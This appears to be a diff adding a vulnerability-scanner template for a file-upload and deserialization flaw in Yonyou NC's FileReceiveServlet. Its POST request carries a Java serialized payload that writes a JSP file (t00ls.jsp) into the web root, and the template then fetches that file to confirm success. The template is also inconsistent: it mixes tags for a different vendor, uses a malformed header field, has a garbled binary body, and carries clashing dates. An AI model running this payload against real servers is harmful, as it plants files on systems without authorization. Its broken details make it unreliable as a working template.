@@ -1,0 +1,35 @@
+id: youyong-nc FileReceiveServlet反序列化
+time: "2023-02-02"
+
+info:
+  severity: critical
+  description: 用友NC产品文件上传的漏洞，恶意攻击者可以通过该漏洞上传任意文件，从而可能导致获取到目标系统管理权限。
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/servlet/FileReceiveServlet"
+      - "{{BaseURL}}/t00ls.jsp"
+    Rheader:
+      - Accept-Encoding:gzip, deflate & Accept:*/* & Connection:close & Content-Type:multipart/form-data;
+        
+    body: 
+      - |
+        ¬ísrjava.util.HashMapÚÁÃ`ÑFloadFactorI  thresholdxp?@wt  FILE_NAMEt  t00ls.jsptTARGET_FILE_PATHt./webapps/nc_webxsasaa
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qiuyouyymvvcbiguy"
+
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
